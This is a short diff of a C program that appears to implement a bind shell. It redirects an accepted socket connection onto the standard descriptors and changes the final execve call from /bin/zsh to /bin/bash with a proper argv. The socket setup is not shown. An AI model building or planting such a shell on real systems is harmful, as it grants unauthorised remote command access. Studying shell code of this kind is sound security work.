@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <sys/types.h>
 #include <unistd.h>
 
 int main(void){
@@ -55,9 +54,12 @@ int main(void){
 
     dup2(acceptfd, i);
   }
-
+  
   // Execve
-  execve("/bin/zsh", NULL, NULL);
+  char *filepath = "/bin/bash";
+  char *argv[] = {filepath, NULL, NULL };
+  execve(filepath, argv, NULL);
+
 
   return 0;
 }
